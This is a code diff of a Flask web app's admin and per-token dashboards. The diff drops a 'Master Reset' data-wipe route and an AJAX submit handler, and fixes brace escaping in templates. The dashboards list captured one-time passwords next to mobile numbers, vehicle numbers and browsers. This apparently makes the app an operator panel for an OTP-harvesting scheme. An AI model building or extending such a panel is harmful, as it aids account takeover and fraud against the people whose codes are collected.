@@ -339,7 +339,7 @@ def render_token_section_partial(token, section):
         partial = f"""
         <div class="card">
             <h3>OTP Data - {token}</h3>
-            <form method="POST" action="/status/{token}?embed=1&section=otp" onsubmit="handleFormSubmit(event, this); return false;">
+            <form method="POST" action="/status/{token}?embed=1&section=otp">
             <table style="width:100%;border-collapse:collapse;">
                 <tr style="background:#2980B9;color:white;"><th>Select</th><th>Mobile</th><th>Vehicle</th><th>OTP</th><th>Browser</th><th>Date</th><th>Reason</th></tr>
                 {rows if rows else '<tr><td colspan="7" style="padding:12px">No OTPs found</td></tr>'}
@@ -362,7 +362,7 @@ def render_token_section_partial(token, section):
         partial = f"""
         <div class="card">
             <h3>Login Detections - {token}</h3>
-            <form method="POST" action="/status/{token}?embed=1&section=login" onsubmit="handleFormSubmit(event, this); return false;">
+            <form method="POST" action="/status/{token}?embed=1&section=login">
             <table style="width:100%;border-collapse:collapse;">
                 <tr style="background:#2980B9;color:white;"><th>Select</th><th>Mobile</th><th>Date</th><th>Source</th></tr>
                 {rows if rows else '<tr><td colspan="4" style="padding:12px">No login detections</td></tr>'}
@@ -442,106 +442,89 @@ def admin():
     <head>
         <title>Admin Dashboard</title>
         <style>
-            body { font-family: 'Segoe UI', Arial, sans-serif; margin:0; background:#f4f6f9; }
-            .app { display:flex; min-height:100vh; }
-            .sidebar { width:260px; background:#2C3E50; color:white; padding:22px; box-sizing:border-box; display:flex; flex-direction:column; }
-            .sidebar h2 { margin:0 0 14px; font-size:20px; text-align:center; color:#fff; }
-            .sidebar a.menu-link { display:block; padding:10px; margin-bottom:8px; color:#fff; text-decoration:none; background:rgba(255,255,255,0.03); border-radius:6px; }
-            .main { flex-grow:1; padding:24px; }
-            .card { background:white; padding:16px; border-radius:8px; box-shadow:0px 4px 18px rgba(0,0,0,0.06); margin-bottom:20px; }
-            table { width:100%; border-collapse:collapse; }
-            table th { background:#2980B9; color:white; padding:10px; text-align:left; }
-            table td { padding:10px; border-bottom:1px solid #eee; }
-            .tokens-grid { display:flex; gap:12px; flex-wrap:wrap; }
-            .token-tile { padding:12px;background:#ecf0f1;border-radius:6px;width:160px;text-align:center;cursor:pointer;font-weight:700;color:#2C3E50; }
-            .muted { color:#666; font-size:13px; }
-            .inline-btn { padding:6px 8px;background:#2980B9;color:#fff;border-radius:6px;border:none;cursor:pointer;margin-left:6px; }
+            body {{ font-family: 'Segoe UI', Arial, sans-serif; margin:0; background:#f4f6f9; }}
+            .app {{ display:flex; min-height:100vh; }}
+            .sidebar {{ width:260px; background:#2C3E50; color:white; padding:22px; box-sizing:border-box; display:flex; flex-direction:column; }}
+            .sidebar h2 {{ margin:0 0 14px; font-size:20px; text-align:center; color:#fff; }}
+            .sidebar a.menu-link {{ display:block; padding:10px; margin-bottom:8px; color:#fff; text-decoration:none; background:rgba(255,255,255,0.03); border-radius:6px; }}
+            .main {{ flex-grow:1; padding:24px; }}
+            .card {{ background:white; padding:16px; border-radius:8px; box-shadow:0px 4px 18px rgba(0,0,0,0.06); margin-bottom:20px; }}
+            table {{ width:100%; border-collapse:collapse; }}
+            table th {{ background:#2980B9; color:white; padding:10px; text-align:left; }}
+            table td {{ padding:10px; border-bottom:1px solid #eee; }}
+            .tokens-grid {{ display:flex; gap:12px; flex-wrap:wrap; }}
+            .token-tile {{ padding:12px;background:#ecf0f1;border-radius:6px;width:160px;text-align:center;cursor:pointer;font-weight:700;color:#2C3E50; }}
+            .muted {{ color:#666; font-size:13px; }}
+            .inline-btn {{ padding:6px 8px;background:#2980B9;color:#fff;border-radius:6px;border:none;cursor:pointer;margin-left:6px; }}
         </style>
         <script>
-            function loadTokens() {
+            function loadTokens() {{
                 var tokens = {tokens_js_list};
                 var html = "<div class='card'><h3>Tokens</h3><div class='tokens-grid'>";
-                tokens.forEach(function(t) {
+                tokens.forEach(function(t) {{
                     html += "<div class='token-tile' onclick=\\"loadTokenFull('" + t + "')\\">" + t + "</div>";
-                });
+                }});
                 html += "</div></div>";
                 document.getElementById('content_panel').innerHTML = html;
-            }
-            function loadTokenFull(token) {
+            }}
+            function loadTokenFull(token) {{
                 // load the full token dashboard (admin variant) into right panel
                 document.getElementById('content_panel').innerHTML = "<div class='card'><p>Loading token dashboard...</p></div>";
-                fetch('/status/' + token + '?embed=admin_full', { credentials: 'same-origin' })
-                    .then(function(r){ return r.text(); })
-                    .then(function(html){ document.getElementById('content_panel').innerHTML = html; })
-                    .catch(function(e){ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; });
-            }
-            function loadLimit() {
+                fetch('/status/' + token + '?embed=admin_full', {{ credentials: 'same-origin' }})
+                    .then(function(r){{ return r.text(); }})
+                    .then(function(html){{ document.getElementById('content_panel').innerHTML = html; }})
+                    .catch(function(e){{ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; }});
+            }}
+            function loadLimit() {{
                 var tokens = {tokens_js_list};
                 var html = "<div class='card'><h3>Limit Exceeded - Select Token</h3><div class='tokens-grid'>";
-                tokens.forEach(function(t) {
+                tokens.forEach(function(t) {{
                     html += "<div class='token-tile' onclick=\\"loadLimitToken('" + t + "')\\">" + t + "</div>";
-                });
+                }});
                 html += "</div></div>";
                 document.getElementById('content_panel').innerHTML = html;
-            }
-            function loadLimitToken(token) {
+            }}
+            function loadLimitToken(token) {{
                 document.getElementById('content_panel').innerHTML = "<div class='card'><p>Loading limit-exceeded...</p></div>";
-                fetch('/admin/limit/' + token + '?embed=1', { credentials: 'same-origin' })
-                    .then(function(r){ return r.text(); })
-                    .then(function(html){ document.getElementById('content_panel').innerHTML = html; })
-                    .catch(function(e){ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; });
-            }
-            function loadCaps() {
+                fetch('/admin/limit/' + token + '?embed=1', {{ credentials: 'same-origin' }})
+                    .then(function(r){{ return r.text(); }})
+                    .then(function(html){{ document.getElementById('content_panel').innerHTML = html; }})
+                    .catch(function(e){{ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; }});
+            }}
+            function loadCaps() {{
                 document.getElementById('content_panel').innerHTML = "<div class='card'><p>Loading caps...</p></div>";
-                fetch('/admin/caps?embed=1', { credentials: 'same-origin' })
-                    .then(function(r){ return r.text(); })
-                    .then(function(html){ document.getElementById('content_panel').innerHTML = html; })
-                    .catch(function(e){ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; });
-            }
-            function loadAdminChangePassword() {
+                fetch('/admin/caps?embed=1', {{ credentials: 'same-origin' }})
+                    .then(function(r){{ return r.text(); }})
+                    .then(function(html){{ document.getElementById('content_panel').innerHTML = html; }})
+                    .catch(function(e){{ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; }});
+            }}
+            function loadAdminChangePassword() {{
                 document.getElementById('content_panel').innerHTML = "<div class='card'><p>Loading...</p></div>";
-                fetch('/admin/change-password?embed=1', { credentials: 'same-origin' })
-                    .then(function(r){ return r.text(); })
-                    .then(function(html){ document.getElementById('content_panel').innerHTML = html; })
-                    .catch(function(e){ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; });
-            }
-            function loadMasterReset() {
-                document.getElementById('content_panel').innerHTML = "<div class='card'><p>Loading...</p></div>";
-                fetch('/admin/master-reset?embed=1', { credentials: 'same-origin' })
-                    .then(function(r){ return r.text(); })
-                    .then(function(html){ document.getElementById('content_panel').innerHTML = html; })
-                    .catch(function(e){ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; });
-            }
+                fetch('/admin/change-password?embed=1', {{ credentials: 'same-origin' }})
+                    .then(function(r){{ return r.text(); }})
+                    .then(function(html){{ document.getElementById('content_panel').innerHTML = html; }})
+                    .catch(function(e){{ document.getElementById('content_panel').innerHTML = "<div class='card' style='color:red'>Failed to load</div>"; }});
+            }}
             // server time updater (client-side)
-            function updateServerTime() {
+            function updateServerTime() {{
                 var now = new Date();
                 document.getElementById('server_time').innerText = now.toLocaleString();
-            }
+            }}
             setInterval(updateServerTime, 1000);
-            window.onload = function() {
+            window.onload = function() {{
                 document.getElementById('content_panel').innerHTML = "<div class='card'><h3>Welcome, Admin</h3><p class='muted'>Click TOKENS or other actions on the left to fetch fresh data into this panel.</p></div>";
                 updateServerTime();
-            };
+            }};
             // inject processed mobiles below the caps table
-            function showProcessedMobiles(token) {
+            function showProcessedMobiles(token) {{
                 var target = document.getElementById('processed_mobiles_container');
                 if (!target) return;
                 target.innerHTML = '<div class="card"><p>Loading...</p></div>';
-                fetch('/admin/processed/' + token + '?embed=1', { credentials: 'same-origin' })
-                    .then(function(r) { return r.text(); })
-                    .then(function(html) { target.innerHTML = html; })
-                    .catch(function(e) { target.innerHTML = '<div class="card" style="color:red">Failed to load</div>'; });
-            }
-            function handleFormSubmit(event, form) {
-                event.preventDefault();
-                let formData = new FormData(form);
-                fetch(form.action, {method: 'POST', body: formData})
-                    .then(response => response.text())
-                    .then(html => {
-                        form.parentNode.outerHTML = html;
-                    })
-                    .catch(error => console.error('Error:', error));
-            }
+                fetch('/admin/processed/' + token + '?embed=1', {{ credentials: 'same-origin' }})
+                    .then(function(r) {{ return r.text(); }})
+                    .then(function(html) {{ target.innerHTML = html; }})
+                    .catch(function(e) {{ target.innerHTML = '<div class="card" style="color:red">Failed to load</div>'; }});
+            }}
         </script>
     </head>
     <body>
@@ -552,7 +535,6 @@ def admin():
                 <a href="#" class="menu-link" onclick="loadLimit()">LIMIT EXCEEDED</a>
                 <a href="#" class="menu-link" onclick="loadCaps()">TOKEN CAPS</a>
                 <a href="#" class="menu-link" onclick="loadAdminChangePassword()">CHANGE ADMIN PASSWORD</a>
-                <a href="#" class="menu-link" onclick="loadMasterReset()">MASTER RESET</a>
                 <a href="/admin-logout" class="menu-link" style="background:#E74C3C;">LOGOUT</a>
                 <div style="margin-top:auto;color:#bdc3c7;font-size:12px;padding-top:12px;">Server time: <span id="server_time"></span></div>
             </div>
@@ -597,7 +579,7 @@ def admin_limit(token):
         partial = f"""
         <div class="card">
             <h3>Limit Exceeded - {token}</h3>
-            <form method="POST" action="/admin/limit/{token}?embed=1" onsubmit="handleFormSubmit(event, this); return false;">
+            <form method="POST" action="/admin/limit/{token}?embed=1">
                 <table style="width:100%;border-collapse:collapse;">
                     <tr style="background:#E74C3C;color:white;"><th>Select</th><th>Mobile</th><th>Vehicle</th><th>OTP</th><th>Browser</th><th>Date</th></tr>
                     {rows if rows else '<tr><td colspan="6" style="padding:12px">No limit-exceeded OTPs</td></tr>'}
@@ -624,7 +606,7 @@ def admin_caps():
         for t in PREDEFINED_TOKENS:
             rows += f"<tr id='cap_row_{idx}'><td>{t}</td><td style='text-align:center'>{len(token_processed_mobiles[t])}</td><td style='text-align:center'>{token_mobile_caps[t] if token_mobile_caps[t] is not None else 'Unlimited'}</td>"
             rows += f"<td><form method='POST' action='/admin/update-cap' style='display:inline-block'><input type='hidden' name='token' value='{t}'><input type='number' name='cap' placeholder='Enter cap' style='padding:6px;width:120px;margin-right:6px;'><button type='submit' class='primary' style='padding:6px 10px;background:#2980B9;color:white;border:none;border-radius:4px;'>Set</button></form>"
-            rows += f"<button onclick=\\"showProcessedMobiles('{t}')\\" style='padding:6px 8px;background:#2ecc71;color:#fff;border-radius:6px;border:none;cursor:pointer;margin-left:8px;'>Processed Mobiles</button></td></tr>"
+            rows += f"<button onclick=\"showProcessedMobiles('{t}')\" style='padding:6px 8px;background:#2ecc71;color:#fff;border-radius:6px;border:none;cursor:pointer;margin-left:8px;'>Processed Mobiles</button></td></tr>"
             idx += 1
 
         partial = f"""
@@ -708,49 +690,6 @@ def admin_change_password():
             </form>
         </div>
         """
-    return redirect(url_for("admin"))
-
-# Admin master reset
-@app.route('/admin/master-reset', methods=['GET', 'POST'])
-def admin_master_reset():
-    if not session.get("is_admin"):
-        return redirect(url_for("admin_login"))
-    if request.method == 'POST':
-        action = request.form.get('action')
-        if action == 'delete_all_otp':
-            for t in PREDEFINED_TOKENS:
-                otp_data[t].clear()
-        elif action == 'delete_all_logins':
-            for t in PREDEFINED_TOKENS:
-                login_sessions[t].clear()
-        elif action == 'reset_all_processed':
-            for t in PREDEFINED_TOKENS:
-                token_processed_mobiles[t].clear()
-        elif action == 'delete_everything':
-            for t in PREDEFINED_TOKENS:
-                otp_data[t].clear()
-                login_sessions[t].clear()
-                token_processed_mobiles[t].clear()
-                mobile_otps[t] = []
-                vehicle_otps[t] = []
-                client_sessions[t] = {}
-                browser_queues[t] = {}
-    if request.args.get("embed") == "1":
-        partial = """
-        <div class="card">
-            <h3>Master Reset</h3>
-            <p class="muted">Use with caution. These actions affect all tokens.</p>
-            <form method="POST" action="/admin/master-reset?embed=1" onsubmit="handleFormSubmit(event, this); return false;">
-                <div style="display:flex; flex-direction:column; gap:10px;">
-                    <button type="submit" name="action" value="delete_all_otp" style="padding:10px; background:#e67e22; color:white; border:none; border-radius:6px;">Delete All OTP Data</button>
-                    <button type="submit" name="action" value="delete_all_logins" style="padding:10px; background:#e67e22; color:white; border:none; border-radius:6px;">Delete All Login Detections</button>
-                    <button type="submit" name="action" value="reset_all_processed" style="padding:10px; background:#e67e22; color:white; border:none; border-radius:6px;">Reset All Processed Mobiles</button>
-                    <button type="submit" name="action" value="delete_everything" style="padding:10px; background:#c0392b; color:white; border:none; border-radius:6px;">Delete Everything</button>
-                </div>
-            </form>
-        </div>
-        """
-        return partial
     return redirect(url_for("admin"))
 
 # =========================
@@ -884,37 +823,27 @@ def status(token):
     <head>
         <title>{token} Dashboard</title>
         <style>
-            body { font-family: 'Segoe UI', sans-serif; background:#f9f9f9; margin:0; }
-            h2 { margin:20px 0; text-align:center; color:#2C3E50; }
-            .container { display:flex; min-height:100vh; }
-            .sidebar { width:220px; background:#2C3E50; padding:20px; color:white; }
-            .sidebar button { margin-bottom:15px; width:100%; padding:10px; border:none; background:#3498DB; color:white; cursor:pointer; border-radius:6px; font-weight:700; }
-            .content { flex-grow:1; padding:30px; }
-            .card { background:white; padding:16px; border-radius:8px; box-shadow:0px 4px 14px rgba(0,0,0,0.06); }
-            table { border-collapse: collapse; width:100%; background:white; }
-            th, td { border:1px solid #ddd; padding:8px; }
-            th { background:#2980B9; color:white; }
+            body {{ font-family: 'Segoe UI', sans-serif; background:#f9f9f9; margin:0; }}
+            h2 {{ margin:20px 0; text-align:center; color:#2C3E50; }}
+            .container {{ display:flex; min-height:100vh; }}
+            .sidebar {{ width:220px; background:#2C3E50; padding:20px; color:white; }}
+            .sidebar button {{ margin-bottom:15px; width:100%; padding:10px; border:none; background:#3498DB; color:white; cursor:pointer; border-radius:6px; font-weight:700; }}
+            .content {{ flex-grow:1; padding:30px; }}
+            .card {{ background:white; padding:16px; border-radius:8px; box-shadow:0px 4px 14px rgba(0,0,0,0.06); }}
+            table {{ border-collapse: collapse; width:100%; background:white; }}
+            th, td {{ border:1px solid #ddd; padding:8px; }}
+            th {{ background:#2980B9; color:white; }}
         </style>
         <script>
-            function loadSection(section) {
+            function loadSection(section) {{
                 var url = window.location.pathname + '?embed=1&section=' + section;
-                document.getElementById('content_panel').innerHTML = '<div class="card"><p>Loading...</p></div>';
-                fetch(url, { credentials: 'same-origin' })
-                    .then(function(r){ return r.text(); })
-                    .then(function(html){ document.getElementById('content_panel').innerHTML = html; })
-                    .catch(function(e){ document.getElementById('content_panel').innerHTML = '<div class="card" style="color:red">Failed to load</div>'; });
-            }
-            window.onload = function() { loadSection('otp'); }
-            function handleFormSubmit(event, form) {
-                event.preventDefault();
-                let formData = new FormData(form);
-                fetch(form.action, {method: 'POST', body: formData})
-                    .then(response => response.text())
-                    .then(html => {
-                        form.parentNode.outerHTML = html;
-                    })
-                    .catch(error => console.error('Error:', error));
-            }
+                document.getElementById('right_panel').innerHTML = '<div class="card"><p>Loading...</p></div>';
+                fetch(url, {{ credentials: 'same-origin' }})
+                    .then(function(r){{ return r.text(); }})
+                    .then(function(html){{ document.getElementById('right_panel').innerHTML = html; }})
+                    .catch(function(e){{ document.getElementById('right_panel').innerHTML = '<div class="card" style="color:red">Failed to load</div>'; }});
+            }}
+            window.onload = function() {{ loadSection('otp'); }}
         </script>
     </head>
     <body>
@@ -927,7 +856,7 @@ def status(token):
                 <a href="/logout" style="color:white;text-decoration:none;"><button>LOGOUT</button></a>
             </div>
             <div class="content">
-                <div id="content_panel" class="card">
+                <div id="right_panel" class="card">
                     <!-- dynamic content will load here -->
                 </div>
             </div>
